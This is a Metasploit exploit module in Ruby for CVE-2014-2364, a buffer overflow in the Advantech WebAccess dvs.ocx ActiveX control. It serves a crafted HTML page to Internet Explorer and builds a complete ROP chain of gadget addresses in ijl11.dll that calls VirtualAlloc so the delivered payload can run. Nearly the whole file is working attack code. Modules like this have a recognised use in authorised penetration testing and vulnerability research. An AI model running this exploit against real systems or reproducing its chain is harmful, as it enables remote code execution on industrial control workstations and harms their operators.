##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Advantech WebAccess dvs.ocx GetColor Buffer Overflow',
      'Description'    => %q{
        This module exploits a buffer overflow vulnerability in Advantec WebAccess. The
        vulnerability exists in the dvs.ocx ActiveX control, where a dangerous call to
        sprintf can be reached with user controlled data through the GetColor function.
        This module has been tested successfully on Windows 7 SP1 and IE 10.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Unknown', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2014-2364'],
          ['ZDI', '14-255'],
          ['URL', 'http://ics-cert.us-cert.gov/advisories/ICSA-14-198-02']
        ],
      'DefaultOptions' =>
        {
          'InitialAutoRunScript' => 'migrate -f',
        },
      'BrowserRequirements' =>
        {
          :source   => /script|headers/i,
          :os_name  => Msf::OperatingSystems::WINDOWS,
          :ua_name  => /MSIE/i,
          :clsid    => "{5CE92A27-9F6A-11D2-9D3D-000001155641}",
          :method   => "GetColor"
        },
      'Payload'        =>
        {
          'Space'           => 2048,
          'StackAdjustment' => -3500,
          'DisableNopes'    => true,
          'BadChars'        => "\x00\x0a\x0d"
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', { } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jul 17 2014'))
  end

  def on_request_exploit(cli, request, target_info)
    p "#{target_info}"
    print_status("Requested: #{request.uri}")

    content = <<-EOS
<html>
<object classid='clsid:5CE92A27-9F6A-11D2-9D3D-000001155641' id='test' /></object>
<script language='javascript'>
test.GetColor("#{sploit}", 0);
</script>
</html>
    EOS

    print_status("Sending #{self.name}")
    send_response_html(cli, content)
  end

  def sploit
    xpl = Rex::Text.pattern_create(61) #offset

    #xpl << "BBBB" # EIP :-)
    xpl << [0x60014185].pack("V") # RET
    xpl << "CCCCDDDD"
    #xpl << (0x01..0x09).to_a.pack("C*") # ESP
    #xpl << (0x0b..0x0c).to_a.pack("C*")
    #xpl << (0x0e..0xff).to_a.pack("C*")

    # EDI = ESP (ptr to esp)
    xpl << [0x600180ce].pack("V") # XOR EAX,EAX # RETN
    xpl << [0x6001087d].pack("V")  # PUSH ESP # AND AL,10 # JNE IJL11+0X10485 (60010485) [BR=0] # POP EDI # POP ESI # POP EBP # POP EBX # POP ECX # RETN    ** [ijl11.dll] **   |  ascii {PAGE_EXECUTE_READ}
    xpl << [0x41414141].pack("V") # esi
    xpl << [0x60029f6c].pack("V") # ebp .data ijl11.dll
    xpl << [0xfffffff8].pack("V") # ebx
    xpl << [0xffffffff].pack("V") # ecx

    # ECX = 0
    xpl << [0x6002157e].pack("V") # POP EAX # RETN
    xpl << [0x60029f6c].pack("V") # .data ijl11.dll
    xpl << [0x6001b8ec].pack("V") # INC ECX # MOV DWORD PTR DS:[EAX],ECX # RETN

    # eax = 0x40
    xpl << [0x600180ce].pack("V") # XOR EAX,EAX # RETN
    xpl << [0x600243ac].pack("V") # ADD EAX,0C # RETN
    xpl << [0x600243ac].pack("V") # ADD EAX,0C # RETN
    xpl << [0x600243ac].pack("V") # ADD EAX,0C # RETN
    xpl << [0x600243ac].pack("V") # ADD EAX,0C # RETN
    xpl << [0x600243ac].pack("V") # ADD EAX,0C # RETN
    xpl << [0x600243ac].pack("V") # ADD EAX,0C # RETN

    # edx = 0x40
    xpl << [0x6001f0ec].pack("V") # XOR EDX,EDX # RETN
    xpl << [0x60024eb6].pack("V") # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+8] # MUL EAX,ECX # ADD EDX,EBX # POP EBX # RETN 0x10
    xpl << [0x41414141].pack("V")

    # set VirtualAlloc stack and call!
    xpl << [0x60014184].pack("V") # POP ECX # RETN
    xpl << [0x41414141].pack("V")
    xpl << [0x41414141].pack("V")
    xpl << [0x41414141].pack("V")
    xpl << [0x41414141].pack("V")
    xpl << [0x60022653].pack("V") # (ecx => VirtualAlloc) (EDI ptr to address)
    xpl << [0x6001f1c8].pack("V") # push edx # or al,39h # push ecx # or byte ptr [ebp+5], dh # mov eax, 1 # ret
    xpl << "A" * 1000

    xpl.gsub("\"", "\\\"") # Escape double quote, to not break javascript string
  end

end
